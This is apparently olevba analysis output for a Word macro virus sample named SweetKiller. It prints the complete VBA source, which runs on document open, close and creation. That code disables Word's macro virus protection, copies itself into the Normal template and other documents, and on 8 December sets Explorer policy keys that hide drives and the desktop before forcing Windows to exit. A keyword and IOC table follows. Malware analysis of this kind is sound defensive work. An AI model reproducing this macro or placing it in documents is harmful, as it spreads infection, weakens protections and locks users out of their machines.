olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.SweetKiller-b9ccbaaae40e81bb1c1a58ce85a4881d5e19fbbe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.SweetKiller-b9ccbaaae40e81bb1c1a58ce85a4881d5e19fbbe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SweetKiller.bas 
in file: Virus.MSWord.SweetKiller-b9ccbaaae40e81bb1c1a58ce85a4881d5e19fbbe - OLE stream: 'Macros/VBA/SweetKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim MainWindow As Long
Dim MainWindowDC As Long
Dim Pen As Long
Dim Brush As Long
Dim WindowsDir As String * 50
Dim ExitCommand As String

Type LOGFONT
        lfHeight As Long
        lfWidth As Long
        lfEscapement As Long
        lfOrientation As Long
        lfWeight As Long
        lfItalic As Byte
        lfUnderline As Byte
        lfStrikeOut As Byte
        lfCharSet As Byte
        lfOutPrecision As Byte
        lfClipPrecision As Byte
        lfQuality As Byte
        lfPitchAndFamily As Byte
        lfFaceName(50) As Byte
End Type

Dim MyFont As LOGFONT

Declare Function CreateFontIndirect Lib "gdi32" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long
Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long


Declare Function GetActiveWindow Lib "user32" () As Long
Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long

Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function TextOut Lib "gdi32" Alias "TextOutA" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lpString As String, ByVal nCount As Long) As Long

Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long

Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long






Function TimeReached() As Boolean
    If Month(Now) = 12 And Day(Now) = 8 Then
        TimeReached = True
    Else
        TimeReached = False
    End If
End Function

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Create By SweetKiller "
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.SweetKiller.AutoOpen"
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Created by SweetKiller"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.SweetKiller.AutoClose"
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Sub AutoNew()
    If Not InDocument() Then
        GoInIt
    Else
        OutBreak
    End If
End Sub

Function InDocument() As Boolean
    Dim item
    InDocument = False
    For Each item In ActiveDocument.VBProject.VBComponents
        If item.Name = "SweetKiller" Then InDocument = True
    Next
End Function

Function InTemplate() As Boolean
    Dim item
    InTemplate = False
    For Each item In NormalTemplate.VBProject.VBComponents
        If item.Name = "SweetKiller" Then InTemplate = True
    Next
End Function

Sub GoInIt()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SweetKiller", Object:=wdOrganizerObjectProjectItems
End Sub


Sub OutBreak()
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    If Not InTemplate() Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SweetKiller", Object:=wdOrganizerObjectProjectItems
    End If
    If TimeReached Then
        
    
        With MyFont
            .lfHeight = 24
            .lfWidth = 10
            .lfEscapement = 0
            .lfOrientation = 0
            .lfWeight = 600
            .lfItalic = 0
            .lfUnderline = 0
            .lfStrikeOut = 0
            .lfCharSet = 1
            .lfOutPrecision = 0
            .lfClipPrecision = 0
            .lfQuality = 0
            .lfPitchAndFamily = 0
            .lfFaceName(0) = &HCB
            .lfFaceName(1) = &HCE
            .lfFaceName(2) = &HCC
            .lfFaceName(3) = &HE5
            .lfFaceName(4) = 0
        
        End With
    
        MainWindow = GetActiveWindow()

        MainWindowDC = GetWindowDC(MainWindow)

        Brush = CreateSolidBrush(RGB(0, 0, 255))
        Pen = CreatePen(0, 4, RGB(255, 0, 0))
    
        SelectObject MainWindowDC, Pen
        SelectObject MainWindowDC, Brush
        Rectangle MainWindowDC, 100, 200, 440, 300
        
        SelectObject MainWindowDC, CreateFontIndirect(MyFont)
        SetTextColor MainWindowDC, RGB(0, 255, 0)
        SetBkColor MainWindowDC, RGB(0, 0, 255)
        
        SetTextColor MainWindowDC, RGB(255, 255, 0)
        TextOut MainWindowDC, 120, 220, "Microsoft µДІъЖ·ґжФЪєЬ¶аВ©¶ґ", 28
        TextOut MainWindowDC, 120, 250, "ТФєуІ»ТЄК№УГ Microsoft Инјю!", 28
        
        WindowsDir = Space(&H20)
        GetWindowsDirectory WindowsDir, 50
        ExitCommand = Left(WindowsDir, InStr(WindowsDir, vbNullChar) - 1)
        ExitCommand = ExitCommand + "\RUNDLL.EXE user.exe,exitwindowsexec"
        
        Dim KeyID As Long
        Dim result As Long
        result = RegCreateKey(&H80000001, "\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", KeyID)
        If result = 0 Then
            RegSetValueEx KeyID, "NoDrives", 0&, &H3, &HFFFFFFFF, &H4
            RegSetValueEx KeyID, "NoDesktop", 0&, &H4, &H1, &H4
        End If
        Shell ExitCommand
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

